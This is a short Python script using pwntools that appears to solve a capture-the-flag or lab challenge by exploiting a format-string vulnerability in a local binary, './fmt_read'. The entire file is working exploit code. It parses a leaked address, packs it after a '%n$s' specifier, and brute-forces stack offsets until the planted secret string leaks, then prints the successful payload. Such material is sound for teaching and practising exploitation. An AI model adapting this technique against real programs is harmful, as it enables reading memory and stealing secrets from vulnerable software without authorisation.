
from pwn import *

secret = b'SECRET_LEAKME_1337'

for n in range(1, 40):
    q = process('./fmt_read')
    line = q.recvline().decode().strip()
    leakme_addr = int(line.split('@')[1].strip(), 16)
    fmt_part = f'%{n}$s'.encode().ljust(7, b'A')  # Align stack 
    payload = fmt_part + b'\x00' + p64(leakme_addr)  
    q.sendline(payload)
    out = q.recvall(timeout=1)
    q.close()
    if secret in out:
        print(payload)
        print(f'[+] found at offset {n}: {out}')
        break
else:
    print('[-] not found')
